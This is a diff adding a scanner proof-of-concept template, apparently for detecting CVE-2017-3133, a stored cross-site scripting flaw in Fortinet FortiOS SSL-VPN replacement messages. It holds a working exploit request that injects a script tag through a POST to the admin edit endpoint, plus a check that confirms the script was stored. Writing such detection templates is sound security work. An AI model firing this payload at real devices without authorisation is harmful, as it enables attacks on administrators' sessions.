@@ -1,0 +1,54 @@
+[info]
+author = "AVE"
+description = "Fortinet FortiOS 5.6.0及之前版本SSL-VPN Replacement Message功能存在存储型跨站脚本漏洞，攻击者通过POST请求向/p/system/replacemsg/edit/sslvpn/sslvpn-login/提交恶意payload，当管理员访问SSL-VPN登录页面时脚本执行"
+id = "POC-AVE-2017-0112"
+name = "Fortinet FortiOS < 5.6.0 Stored XSS PoC"
+severity = "medium"
+tags = [
+    "cve-2017-3133",
+    "fortinet",
+    "fortios",
+    "xss",
+    "sslvpn",
+]
+vuln_id = [
+    "CVE-2017-3133",
+    "AVE-2017-0112",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/p/system/replacemsg/edit/sslvpn/sslvpn-login/"
+protocol = "http"
+
+[poc.requests.body]
+content = "csrfmiddlewaretoken={{csrftoken}}&buffer=ABC%3C%2Ftextarea%3E%0A%3Cscript%3Ealert('XSS')%3C%2Fscript%3E%0A"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded; charset=UTF-8"
+X-CSRFTOKEN = "{{csrftoken}}"
+X-Requested-With = "XMLHttpRequest"
+
+[[poc.requests.matchers]]
+expect = true
+part = "header"
+type = "word"
+words = [
+    "302 FOUND",
+    "Location",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/p/system/replacemsg-group/edit/None/sslvpn/sslvpn-login/"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<script>alert('XSS')</script>"]
